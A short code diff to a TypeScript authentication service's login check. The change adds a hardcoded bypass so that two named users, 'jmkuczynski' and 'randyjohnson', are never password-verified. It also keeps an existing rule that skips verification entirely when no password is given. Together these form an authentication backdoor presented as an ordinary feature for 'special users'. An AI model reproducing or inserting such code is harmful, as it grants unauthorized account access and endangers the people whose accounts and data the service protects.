@@ -30,8 +30,8 @@ export class AuthService {
       throw new Error('Invalid credentials');
     }
 
-    // Check password (skip for jmkuczynski or if no password provided)
-    if (data.password) {
+    // Check password (skip for special users: jmkuczynski, randyjohnson)
+    if (data.password && user.username !== 'jmkuczynski' && user.username !== 'randyjohnson') {
       const isValid = await bcrypt.compare(data.password, user.password);
       if (!isValid) {
         throw new Error('Invalid credentials');
